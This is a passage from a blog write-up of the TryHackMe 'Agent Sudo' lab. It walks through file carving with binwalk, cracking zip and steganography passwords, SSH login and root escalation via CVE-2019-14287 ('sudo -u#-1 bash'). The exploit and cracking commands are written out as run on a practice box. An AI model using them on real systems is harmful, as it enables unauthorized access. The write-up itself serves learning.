</span></span><span class="line"><span class="cl"><span class="m">34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
</span></span><span class="line"><span class="cl"><span class="m">34820</span>         0x8804          End of Zip archive, footer length: <span class="m">22</span>
</span></span></code></pre></div><p><code>binwalk</code>, in its omnipotence, has a function to extract known file types, using the <code>-e</code> flag.</p>
<p>We also now have the extracted contents of <code>cutie.png</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls
</span></span><span class="line"><span class="cl"><span class="m">365</span>  365.zlib  8702.zip  To_agentR.txt
</span></span></code></pre></div><p>Let&rsquo;s unzip the archive:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ 7z x 8702.zip
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span class="line"><span class="cl">p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,4 CPUs Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i7-7700K CPU @ 4.20GHz <span class="o">(</span>906E9<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanning the drive <span class="k">for</span> archives:
</span></span><span class="line"><span class="cl"><span class="m">1</span> file, <span class="m">280</span> bytes <span class="o">(</span><span class="m">1</span> KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting archive: 8702.zip
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl"><span class="nv">Path</span> <span class="o">=</span> 8702.zip
</span></span><span class="line"><span class="cl"><span class="nv">Type</span> <span class="o">=</span> zip
</span></span><span class="line"><span class="cl">Physical <span class="nv">Size</span> <span class="o">=</span> <span class="m">280</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span></span><span class="line"><span class="cl">ERROR: Wrong password : To_agentR.txt
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">Sub items Errors: <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Archives with Errors: <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sub items Errors: <span class="m">1</span>
</span></span></code></pre></div><p>Usually <code>zip</code> passwords are pretty easy to break in CTFs. Let&rsquo;s see if that&rsquo;s true here:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ zip2john 8702.zip &gt; 4john
</span></span><span class="line"><span class="cl">                                                                    
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls
</span></span><span class="line"><span class="cl"><span class="m">365</span>  365.zlib  4john  8702.zip  To_agentR.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ john 4john
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>ZIP, WinZip <span class="o">[</span>PBKDF2-SHA1 256/256 AVX2 8x<span class="o">])</span>
</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>HMAC size<span class="o">)</span> is <span class="m">78</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
</span></span><span class="line"><span class="cl">Proceeding with single, rules:Single
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if</span> any.
</span></span><span class="line"><span class="cl">Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span class="line"><span class="cl">----n            <span class="o">(</span>8702.zip/To_agentR.txt<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE 2/3 <span class="o">(</span>2022-05-23 11:42<span class="o">)</span> 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed. 
</span></span></code></pre></div><p>It is true. Now we can use <code>----n</code> to access the archive and read the contents of <code>To_agentR.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Agent C,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We need to send the picture to &#39;-------x&#39; as soon as possible!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">By,
</span></span><span class="line"><span class="cl">Agent R
</span></span></code></pre></div><p>As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: <strong>base64 is not encryption</strong>. This is apparently a <a href="https://twitter.com/sempf/status/988525614444539904">big deal</a> <a href="https://github.com/sethvargo/base64-is-not-encryption">for kubernetes folks</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ touch -------x.txt
</span></span><span class="line"><span class="cl">                                                                    
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ vim -------x.txt
</span></span><span class="line"><span class="cl">                                                                    
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ base64 -d <span class="s1">&#39;-------x.txt&#39;</span>
</span></span><span class="line"><span class="cl">-----1   
</span></span></code></pre></div><p>Reading other write-ups after finishing the box, I learned about <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> which looks great for stuff like this in the future.</p>
<p>The next prompt on THM asks for the <code>steg password</code>. I don&rsquo;t know what that is, so I search for it and <a href="https://www.kali.org/tools/stegcracker/">stegcracker</a> tops the list. Let&rsquo;s try it, in conjunction with our remaining alien image <code>cute-alien.jpg</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ stegcracker cute-alien.jpg
</span></span><span class="line"><span class="cl">StegCracker 2.1.0 - <span class="o">(</span>https://github.com/Paradoxis/StegCracker<span class="o">)</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> - Luke Paris <span class="o">(</span>Paradoxis<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">StegCracker has been retired following the release of StegSeek, which 
</span></span><span class="line"><span class="cl"><span class="s2">&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">StegSeek can be found at: https://github.com/RickdeJager/stegseek
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">No wordlist was specified, using default rockyou.txt wordlist.
</span></span></span><span class="line"><span class="cl"><span class="s2">Counting lines in wordlist..
</span></span></span><span class="line"><span class="cl"><span class="s2">Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
</span></span></span></code></pre></div><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
<p>I learned about <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> which is a really cool little utility, but, sadly, not helpful here. The next thing to try is <a href="https://www.kali.org/tools/steghide/">steghide</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">                                                         
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ steghide --extract -sf cute-alien.jpg
</span></span><span class="line"><span class="cl">Enter passphrase: 
</span></span><span class="line"><span class="cl">wrote extracted data to <span class="s2">&#34;message.txt&#34;</span>.
</span></span><span class="line"><span class="cl">                                                         
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat message.txt
</span></span><span class="line"><span class="cl">Hi ----s,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Glad you find this message. Your login password is hackerrules!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Don<span class="err">&#39;</span>t ask me why the password look cheesy, ask agent R who <span class="nb">set</span> this password <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your buddy,
</span></span><span class="line"><span class="cl">----s
</span></span></code></pre></div><p>Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ stegcracker cute-alien.jpg
</span></span><span class="line"><span class="cl">StegCracker 2.1.0 - <span class="o">(</span>https://github.com/Paradoxis/StegCracker<span class="o">)</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> - Luke Paris <span class="o">(</span>Paradoxis<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">StegCracker has been retired following the release of StegSeek, which 
</span></span><span class="line"><span class="cl">will blast through the rockyou.txt wordlist within 1.9 second as opposed 
</span></span><span class="line"><span class="cl">to StegCracker which takes ~5 hours.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">StegSeek can be found at: https://github.com/RickdeJager/stegseek
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">No wordlist was specified, using default rockyou.txt wordlist.
</span></span><span class="line"><span class="cl">Counting lines in wordlist..
</span></span><span class="line"><span class="cl">Attacking file <span class="s1">&#39;cute-alien.jpg&#39;</span> with wordlist <span class="s1">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>..
</span></span><span class="line"><span class="cl">Successfully cracked file with password: -----1doro1111
</span></span><span class="line"><span class="cl">Tried <span class="m">441203</span> passwords
</span></span><span class="line"><span class="cl">Your file has been written to: cute-alien.jpg.out
</span></span><span class="line"><span class="cl">-----1
</span></span><span class="line"><span class="cl">                                                         
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat cute-alien.jpg.out
</span></span><span class="line"><span class="cl">Hi ----s,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Glad you find this message. Your login password is hackerrules!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Don<span class="err">&#39;</span>t ask me why the password look cheesy, ask agent R who <span class="nb">set</span> this password <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your buddy,
</span></span><span class="line"><span class="cl">----s    
</span></span></code></pre></div><p>Let&rsquo;s log in via <code>ssh</code> and find our user flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ssh ----s@10.10.108.206
</span></span><span class="line"><span class="cl">----s@10.10.108.206<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-55-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Mon May <span class="m">23</span> 16:28:05 UTC <span class="m">2022</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  1.07              Processes:           <span class="m">99</span>
</span></span><span class="line"><span class="cl">  Usage of /:   39.8% of 9.78GB   Users logged in:     <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 19%               IP address <span class="k">for</span> eth0: 10.10.108.206
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">75</span> packages can be updated.
</span></span><span class="line"><span class="cl"><span class="m">33</span> updates are security updates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Tue Oct <span class="m">29</span> 14:26:27 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">----s@agent-sudo:~$ ls
</span></span><span class="line"><span class="cl">Alien_autospy.jpg  user_flag.txt
</span></span><span class="line"><span class="cl">----s@agent-sudo:~$ cat user_flag.txt
</span></span><span class="line"><span class="cl">🎌<span class="sb">`</span>user flag<span class="sb">`</span>🎌
</span></span><span class="line"><span class="cl">----s@agent-sudo:~$ 
</span></span></code></pre></div><p>While the secret agents certainly have more knowledge about image-based cryptography, I spot that they&rsquo;ve misspelled &ldquo;autopsy&rdquo; in the image file name, which, despite being a tiny victory helps my ego.</p>
<p>Now let&rsquo;s try to get root. First, I check to see what our friend <code>----s</code> has <code>sudo</code> permissions to run:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">----s@agent-sudo:~$ sudo -l
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ----s: 
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> ----s on agent-sudo:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User ----s may run the following commands on agent-sudo:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL, !root<span class="o">)</span> /bin/bash
</span></span></code></pre></div><p>Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows <code>----s</code> to run <code>bash</code> as any user except root – is quite sensible. However, unfortunately, <code>sudo</code> faithfully interprets <code>#-1</code> after the <code>-u</code> user flag and, upon checking for user number <code>-1</code>,  will run as user <code>0</code>: <code>root</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">----s@agent-sudo:~$ sudo -u#-1 bash
</span></span><span class="line"><span class="cl">root@agent-sudo:~# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>This can also be done with <code>4294967295</code> instead of <code>-u</code>. h/t <a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">WhiteSource</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">----s@agent-sudo:~$ sudo -u#4294967295 bash
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ----s: 
</span></span><span class="line"><span class="cl">root@agent-sudo:~# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Pretty crazy!</p>
<p>Now for the final spy message of the box:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@agent-sudo:/# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">root@agent-sudo:/root# ls
</span></span><span class="line"><span class="cl">root.txt
</span></span><span class="line"><span class="cl">root@agent-sudo:/root# cat root.txt
</span></span><span class="line"><span class="cl">To Mr.hacker,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Congratulation on rooting this box. This box was designed <span class="k">for</span> TryHackMe. Tips, always update your machine. 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your flag is 
</span></span><span class="line"><span class="cl">🎌root flag🎌
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">By,
</span></span><span class="line"><span class="cl">-----l a.k.a Agent R
</span></span></code></pre></div><h3 id="notes">Notes</h3>
<p>I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with <code>binwalk</code> and the various tricks and utilities related to <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a> - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.</p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://robscharf.github.io/tags/blog/">blog</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/tryhackme/">tryhackme</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/gobuster/">gobuster</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/nmap/">nmap</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/hydra/">hydra</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/binwalk/">binwalk</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/johntheripper/">johntheripper</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/stegcracker/">stegcracker</a></span>
        <span class="tag"><a href="https://robscharf.github.io/tags/steghide/">steghide</a></span>
        
    </p>

      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://robscharf.github.io/categories/ctf/">ctf</a></span>
        <span class="tag"><a href="https://robscharf.github.io/categories/tryhackme/">TryHackMe</a></span>
        
    </p>


      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        2463 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2022-05-23 10:14
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20Agent%20Sudo%20--%20Write-Up&amp;caption=THM%3a%20Agent%20Sudo%20--%20Write-Up&amp;canonicalUrl=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20Agent%20Sudo%20--%20Write-Up&amp;body=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f&amp;media=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f;description=THM%3a%20Agent%20Sudo%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f&amp;title=THM%3a%20Agent%20Sudo%20--%20Write-Up&amp;summary=THM%3a%20Agent%20Sudo%20--%20Write-Up&amp;source=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-agent-sudo--write-up%2f&amp;resubmit=true&amp;title=THM%3a%20Agent%20Sudo%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
